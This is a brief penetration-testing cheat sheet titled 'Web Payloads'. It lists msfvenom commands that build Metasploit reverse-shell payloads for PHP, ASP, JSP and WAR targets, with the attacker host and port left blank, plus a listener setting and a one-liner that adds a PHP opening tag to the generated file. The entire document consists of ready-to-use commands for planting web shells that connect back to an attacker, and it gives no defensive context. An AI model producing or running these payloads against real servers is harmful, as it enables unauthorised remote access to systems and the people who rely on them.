# **Web Payload**

_**

## Web Payloads

**_

##   
  
msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw > shell.php  
PHP  
  
set payload php/meterpreter/reverse_tcp  
Listener  
  
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php  
PHP  
  
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp  
ASP  
  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x  
JSP  
  
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war  
WAR